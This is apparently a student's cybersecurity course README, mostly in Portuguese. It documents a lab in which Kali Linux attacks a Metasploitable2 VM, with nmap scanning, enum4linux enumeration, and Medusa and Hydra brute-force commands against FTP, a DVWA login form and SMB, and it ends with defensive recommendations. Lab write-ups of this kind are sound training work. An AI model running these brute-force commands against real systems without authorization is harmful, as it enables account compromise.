# DioCybersecurity
Projecto del curso de dio de ciberseguridad

Para este projeto, assim como no curso, vou usar o Metasploitable2 e o Kali Linux.
As screenshots encontram-se dentro da pasta 'images' e os arquivos de texto encontram-se na pasta 'text files'.

01 Instalar o Kali Linux e o Metasploitable2 e configurar as redes em modo host-only.
    1.1 Configuração Kali Linux        (SCREENSHOT 1.1)
    1.2 Configuração Metasploitable2   (SCREENSHOT 1.2)

02 DETERMINAR O IP DO SISTEMA VULNERÁVEL
    Para determinar o IP do Metasploitable, usamos o comando {ip a} no terminal do Metasploitable2.
    comando: {ip a}
    resultado: SCREENSHOT 2.1
    IP Metasploitable2: 192.168.56.102

03 TESTAR A CONEXÃO COM A MÁQUINA VULNERÁVEL
    comando: {ping -c 3 192.168.56.102}
    resultado: SCREENSHOT 3.1
    A conexão foi bem-sucedida.

04 MAPEAR AS PORTAS MAIS USADAS PARA VER SE ALGUMA ESTÁ EXPOSTA
    comando: {nmap -sV -p 21,22,80,445,139 192.168.56.102}
    resultado: SCREENSHOT 4.1
    O mapeamento é efetivo e devolve os detalhes dos serviços rodando nas portas ativas.

05 VERIFICAR SE O SERVIDOR FTP ESTÁ ATIVO
    comando: {ftp 192.168.56.102}
    resultado: SCREENSHOT 5.1
    Conectou-se ao servidor FTP.

06 CRIAR OS ARQUIVOS DE USUÁRIOS E SENHA
    6.1 Criar arquivo com a lista de usuários
        comando: {echo -e "user\nadmin\nmsfadmin\nroot" > users.txt}
        resultado: SCREENSHOT 6.1
    6.2 Criar arquivo com a lista de senhas
        comando: {echo -e "123456\npassword\nadmin\nmsfadmin\nqwerty" > passwords.txt}
        resultado: SCREENSHOT 6.1

07 ATAQUE DE FORÇA BRUTA NO SERVIDOR FTP
    7.1 Executar o ataque de força bruta
        comando: {medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -t 6}
        resultado: SCREENSHOT 7.1
        Neste caso, encontrou uma única correspondência (match) com o usuário e senha msfadmin.


    7.2 Verificar a conexão ao servidor FTP com o usuário e senha encontrados
        resultado: SCREENSHOT 7.2
        Conectou com sucesso.


08 ATAQUE DE FORÇA BRUTA NO SERVIDOR HTTP
    8.1 Acessar o servidor inseguro
    http://192.168.56.102/dvwd/login.php
    resultado: SCREENSHOT 8.1

    8.2 Tentar um login com um usuário e senha aleatórios
        8.2.1 Com F12, entramos na janela de desenvolvedor do navegador e vamos para a aba rede (network)
        8.2.2 Faço a tentativa de login com 
            usuario=usuario1
            password=password1
            resultado: devolve a mensagem Login failed 
        8.2.3 Faço clique no método POST e depois na aba request para ver os campos enviados.
            resultado: SCREENSHOT 8.2
            username: "usuario1"
            password: "password1"
            Login: "Login"

    8.3 Ataque de força bruta ao servidor HTTP usando Medusa.
        comando: {
            medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M http \
            -m PAGE:'/dvwa/login.php' \
            -m FORM:'username=^USER^&password=^PASSWORD^&Login=Login' \
            -m 'FAIL=Login failed' -t 6
        }
        resultado: SCREENSHOT 8.3.1
        O resultado devolvido é errático, devolve vários sucessos mas nem sempre na mesma ordem, exatamente como acontece no vídeo do curso.
        Com a ajuda do Gemini, usei o comando {curl -i -L -d "username=admin&password=wrong&Login=Login" http://192.168.56.102/dvwa/login.php}
        para revisar o texto retornado (SCREENSHOT 8.3.2 E SCREENSHOT 8.3.3) e percebi que no texto retornado não aparece a etiqueta com a mensagem "Login failed" 
        que é observada na página ao fazer uma tentativa de login incorreta.
        Usei outro tipo de texto para a verificação ('FAIL=Login') e o resultado foi igual.
        Tentei com o Hydra (SCREENSHOT 8.3.4) e também me deu o mesmo resultado.



09 ATAQUE DE FORÇA BRUTA NO SERVIDOR SMB
    9.1 Enumerar possíveis usuários do servidor SMB
        comando: {enum4linux -a 192.168.56.102 | tee enum4_output.txt}
        resultado: SCREENSHOT 9.1
        Na resposta aparecem os usuários encontrados; como são muitos, editei o arquivo gerado enum4_output.txt deixando apenas os usuários para criar o arquivo smb_users.txt
        que usarei no ataque de força bruta.

    9.2 Criar o arquivo com as senhas
        comando: {echo -e "123456\npasswrd\nWelcome123\nmsfadmin\nqwerty" > smb_passwords.txt}
        resultado: SCREENSHOT 9.2


    9.3 Realizar o ataque usando o Medusa
        comando:{medusa -h 192.168.56.102 -U smb_users.txt -P smb_password.txt -M smbnt -t 2 -T 50}
        resultado: SCREENSHOT 9.3
        Devolve uma única correspondência com o usuário e senha msfadmin.

    9.4 Tentar o acesso usando o smbclient com o usuário e senha encontrados
        comando: {smbclient -L //192.168.56.102 -U Usuario}
        resultado: SCREENSHOT 9.4

10 Recomendações finais para evitar estes tipos de ataques
    As principais medidas para evitar estas ameaças são:
        1- Usar bloqueio por tentativas falhas. Ou seja, que o servidor bloqueie as conexões durante um tempo quando detectar várias tentativas de conexão falhas simultaneamente.
        2- Insistir com os usuários para que usem senhas complexas e aleatórias, e que as mudem periodicamente.
        3- Usar autenticação de dois fatores ou biometria como uma camada adicional de segurança.
